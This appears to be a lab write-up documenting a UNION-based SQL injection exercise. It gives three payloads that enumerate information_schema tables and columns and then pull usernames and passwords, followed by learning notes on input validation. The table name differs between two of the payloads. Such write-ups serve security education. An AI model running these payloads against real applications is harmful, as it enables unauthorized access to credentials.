# Lab Name
SQL injection attack, listing the database contents on non-Oracle databases

## Vulnerability
SQL Injection (UNION-based)

## Objective
Exploit UNION-based SQL Injection to listing the database contents on non-Oracle databases

## Entry Point
Category parameter

## Payload Used
  
  UNION SELECT table_name, NULL FROM information_schema.tables--

<img width="1486" height="806" alt="1" src="https://github.com/user-attachments/assets/758c7731-4857-4af0-8b67-277ce5511eca" />

  UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users_oerjyi'--

  <img width="1477" height="756" alt="2" src="https://github.com/user-attachments/assets/2a0bd157-e086-4369-a717-27c6e0e24880" />

  UNION SELECT username_txhvkg, password_zxhqbf FROM users_bmjshg

  <img width="1491" height="761" alt="3" src="https://github.com/user-attachments/assets/c8c5b6be-ce00-4dac-8918-8b180a1b730e" />

## Result
- Successfully extracted administrator credentials after enumerating tables and columns using information_schema.

## Learning
- Reflected query output confirms the application is vulnerable to UNION-based SQL injection.
- Identifying the correct number of columns is mandatory before using UNION SELECT; otherwise the query fails.
- NULL values can be used as placeholders when the data type of other columns is unknown.
- information_schema.tables can be queried to enumerate available database tables.
- information_schema.columns can be used to identify column names within a specific table.
- After identifying the correct table and columns, UNION SELECT can be leveraged to extract sensitive data.
- Poor input validation and lack of parameterized queries allow attackers to access sensitive system information such as usernames and passwords.
